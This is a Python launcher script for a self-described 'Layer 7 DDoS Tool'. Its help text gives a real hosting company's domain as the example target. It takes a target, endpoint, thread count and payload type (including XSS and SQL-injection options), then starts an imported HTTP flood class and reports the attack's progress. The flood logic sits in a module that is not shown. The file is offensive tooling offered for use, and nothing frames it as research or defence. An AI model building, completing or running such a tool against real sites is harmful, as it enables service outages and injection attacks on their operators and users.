from modules import layer_7
import argparse
import time


def main():
    parser = argparse.ArgumentParser(description='Layer 7 DDoS Tool')
    parser.add_argument('target', help='Target domain (e.g., vietnix.vn)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP Method')
    parser.add_argument('-p', '--protocol', default='https', choices=['http', 'https'], help='Protocol')
    parser.add_argument('-e', '--endpoint', default='/', help='Endpoint path (e.g., /dang-ky-ten-mien/ket-qua/)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads')
    parser.add_argument('--payload', default='domain', choices=['domain', 'search', 'xss', 'sqli'], help='Payload type')

    args = parser.parse_args()

    print(f"[*] Starting attack on {args.target}")
    print(
        f"[*] Configuration: Method={args.method}, Endpoint={args.endpoint}, Threads={args.threads}, Payload={args.payload}")

    attacker = layer_7.HTTPFlood(
        target=args.target,
        method=args.method,
        protocol=args.protocol,
        endpoint=args.endpoint,
        payload_type=args.payload,
        num_threads=args.threads
    )

    try:
        attacker.start()
        print("[+] Attack is running... Press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        attacker.stop()
        print("[+] All threads stopped")


if __name__ == '__main__':
    main()